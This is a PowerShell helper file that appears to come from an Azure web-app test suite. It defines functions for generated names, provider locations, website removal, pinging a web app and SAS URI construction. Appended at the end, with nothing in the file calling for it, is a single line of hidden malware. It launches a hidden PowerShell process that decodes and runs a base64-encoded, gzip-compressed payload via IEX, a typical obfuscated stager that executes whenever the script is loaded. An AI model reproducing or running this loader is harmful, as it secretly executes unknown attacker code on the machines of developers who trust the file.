﻿













function Get-RandomLetters
{
	return -join ((97..122) | Get-Random -Count 5 | % {[char]$_})
}


function Get-WebsiteName
{
    return "someuniqueWebsite$(Get-RandomLetters)"
}


function Get-TrafficManagerProfileName
{
    return "someuniqueTrafficManager"
}


function Get-WebHostPlanName
{
    return "hostplan231" 
}


function Get-ResourceGroupName
{
    return "rg$(Get-RandomLetters)"
}


function Get-BackupName
{
    return "someuniqueBackupName"
}


function Get-AseName
{
    return "someuniqueAseName"
}


function Get-Location
{
	$namespace = "Microsoft.Web"
	$type = "sites"
	$location = Get-AzureRmResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}

	if ($location -eq $null) 
	{  
		return "West US"  
	} else 
	{  
		return $location.Locations[0]  
	}
}


function Get-SecondaryLocation
{
	$namespace = "Microsoft.Web"
	$type = "sites"
	$location = Get-AzureRmResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}

	if ($location -eq $null) 
	{  
		return "East US"  
	} else 
	{  
		return $location.Locations[1]  
	}

	return "EastUS"
}


function Clean-Website($resourceGroup, $websiteName)
{
	$result = Remove-AzureRmWebsite -ResourceGroupName $resourceGroup.ToString() -WebsiteName $websiteName.ToString() -Force
}

function PingWebApp($webApp)
{
	try 
	{
		$result = Invoke-WebRequest $webApp.HostNames[0] 
		$statusCode = $result.StatusCode
	} 
	catch [System.Net.WebException ] 
	{ 
		$statusCode = $_.Exception.Response.StatusCode
	}

		return $statusCode
}


function Get-SasUri
{
    param ([string] $storageAccount, [string] $storageKey, [string] $container, [TimeSpan] $duration, [Microsoft.WindowsAzure.Storage.Blob.SharedAccessBlobPermissions] $type)

	$uri = "https://$storageAccount.blob.core.windows.net/$container"

	$destUri = New-Object -TypeName System.Uri($uri);
	$cred = New-Object -TypeName Microsoft.WindowsAzure.Storage.Auth.StorageCredentials($storageAccount, $storageKey);
	$destBlob = New-Object -TypeName Microsoft.WindowsAzure.Storage.Blob.CloudPageBlob($destUri, $cred);
	$policy = New-Object Microsoft.WindowsAzure.Storage.Blob.SharedAccessBlobPolicy;
	$policy.Permissions = $type;
	$policy.SharedAccessExpiryTime = (Get-Date).Add($duration);
	$uri += $destBlob.GetSharedAccessSignature($policy);

	return $uri;
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIACOmmFgCA71WbY+iSBD+vJvsfyAbEzHnKKgzczPJJgcqvqw4KgKjnrm00EBrAy40Ku7tf79CcWf2Zncztx+OSGy6qrqrnnqqq50ksBgJAy6RrsOxal0Pmtznd2/fjFCEfI4vrLvppswV/Fb4UZqU3rwBUcF6xNwHjl9I220r9BEJlvf3zSSKcMDO35UOZlIcY39FCY75Evc3Z3o4wlcPqzW2GPeZK/xV6dBwhWiuljaR5WHuSgrsTDYILZR5VdG2lDC++OefxdLiSlxW2p8SRGO+qKUxw37FprRY4r6Usg2n6RbzRZVYURiHDquYJKjXKnoQIwcPYbUdVjHzQjsuliAI+EWYJVHAZeFk9mcpX4ThKAotybYjHINypRfswg3mC0FCaZn7g1/km0+SgBEfg5zhKNxqONoRC8eVLgpsiifYWfJDvL/E/Foj/rkRaI1YVCpDIl56qYZ2QvHZsFh66ecpdyV4nvIHkX959/bdW+eS9X3zUPdvVM2nA+153mH0ZnEaY/CTH4UxOel/4IQyp8KWiIVRCp+FaZTg0pJbZPAvlkuusKcJI0H5xyuIF3VQJt2mFwkOzC6MkNhLsMqzU2BRO5v+Mcla2CEBbqUB8ol14RH/PcyxQ/Ep3spFbQhu8cVcgO0WpthFLIOxzC1emrV9wr7aygmhNo4kC/IWg1eQ0tK3zpwzwxd7gYp9wOn8XYQ8OMBefNHOGZteds++QanYpCiOy9wogfKxypyGEcV2mZOCmOQiKWHhaVh8cldNKCMWitlluWUphzHfrhkGMYsSCzIHoU+1LbYIohkSZa5LbCynGnEv2xa/i0MTUUoCF1baQR5gJotfYxkfIvAwz32pomHW87cU+6B1KmSFIhfKNmf/iULIxXbxXy5e2H2mcobFBYRnDkKCNRqyMmeQiMFxkOGa8+hXXXh2GmTONCOcp4O/VMxCTlnG7wJSW42Mlzk4JygiBjAoUejLKMY3DY1FABL/vvpAmhI8s15AVUveEFHaE7GnwquTei9s3dof++tuNWodPEfqxT21O2qNu93Grq8ZDaa1e+zjqMfU9uN6rUndiT5j857UnRJhM2sct31y1AaSPTtUb47ycS/Ih+PatZ1Zy3HcW0ebiNcKGZjNsSzU0KDVTgamvJeFRtwm++6Y6ONNX2GrmUGR7lTdR/EOkcMgWhtiuPINQep4dWReb42Op9rprFu90w81cTjV4UWtrYmRUxUNGLswVyO30liSbkabLNzd0GSNueCls/o2XW3mc3WtJDNdUfSmwMamsdH8665t0sn0qF+vxMlxZop9ZN71NMVT7DYE2dmKqjCP9Ja3N9p9NG/TDtIPwwf9umkdvTXSxUgX5f24rtfUTl81lUlqKu105s9rww3zsU6PhtLXx1PDwNN2XRPperqWp2PBlfSO90jm1U71zuwf6DCUWgPXU7K47KnhryNDa9yCzETu1kE96ShJzX6jE7b1TugYvidOtjdga5xwMHyXyZ6X6Sv7rt6b1h/nN+0QIJA/jTuu1IYRgncsyVOkkI3+22NVnMNejSAwaq7UA5kuzsP2FvUbu6rhWbJwbMRdyXqA9R6pqQ6dm65TrVZ/bzw0G+mwNU7U9bg+WM8EabDbM9QHP+Up5ObD+4zGwOPCamQa/WcE/VHDUVEUe4gCcaGVXI4MJYyUvDWMQpJZ8Pyzi8EGRwGm0FWh716qT6I0tLIO9U0rgS557l1LOEd0GNZr3x2VuK+KpacWdpm6v5+Dz1DUWdFVBjhwmVcWDnVBgC4kHBoCBP36OJvhNuVPS5WzLnZG6rI4PS1eykq9kBr6/wFgfsp48Ge/FsCnuZ9IXwWqUM4BeDH/7cR/gvgXkTARYaCvwalJ8bl3/xyQnDzPLj2QM2CGkz/ZjfMhYVdDuAr9A5gyFsriCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

